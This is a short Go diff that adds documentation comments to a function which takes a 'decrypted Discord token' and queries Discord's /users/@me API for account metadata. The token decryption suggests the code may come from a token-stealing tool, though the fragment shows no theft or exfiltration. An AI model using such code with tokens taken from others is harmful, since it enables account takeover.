@@ -34,6 +34,9 @@ type DiscordAccount struct {
 	AuthenticatorTypes		[]int		`json:"authenticator_types"`
 }
 
+// This function gets account metadata from the Discord API.
+// Input is a decrypted Discord token.
+// Output is an instance of the DiscordAccount struct filled with the Discord account metadata associated with the token.
 func getAccountData(token string) (account DiscordAccount, err error) {
 	// Create a new GET request to the Discord API
 	request, err := http.NewRequest("GET", "https://discordapp.com/api/v9/users/@me", nil)
